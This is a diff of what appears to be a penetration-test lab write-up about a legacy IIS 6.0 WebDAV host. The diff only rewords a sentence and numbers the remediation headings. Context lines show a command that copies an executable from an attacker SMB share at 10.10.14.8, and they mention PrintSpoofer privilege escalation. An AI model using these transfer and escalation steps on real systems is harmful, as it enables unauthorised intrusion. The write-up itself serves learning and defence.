@@ -145,7 +145,7 @@ SMB file transfer via Impacket **smbserver.py** was ultimately successful. Files
 copy \\10.10.14.8\sharename\file.exe
 ```
 
-Unfortunately, PrintSpoofer, an exploit typically successful in **SeImpersonatePrivilege** vulnerabilities did not work on this machine.
+PrintSpoofer, an exploit typically successful in **SeImpersonatePrivilege** vulnerabilities, did not work on this machine.
 
 ---
 
@@ -197,15 +197,15 @@ IIS 6.0 (2003) is end-of-life and contains multiple unpatched RCE vulnerabilitie
 
 If WebDAV is not required, disable it entirely.
 
-### Restrict SeImpersonatePrivilege
+### 3. Restrict SeImpersonatePrivilege
 
 This privilege allows significant escalation paths. Ensure only trusted services possess it.
 
-### Apply Strong File Transfer Controls
+### 4. Apply Strong File Transfer Controls
 
 Legacy hosts lack secure utilities. Modernizing host and enabling PowerShell or secure transfer mechanisms is recommended.
 
-### Implement Network Segmentation
+### 5. Implement Network Segmentation
 
 Legacy systems should be placed in isolated VLANs away from critical assets.
 
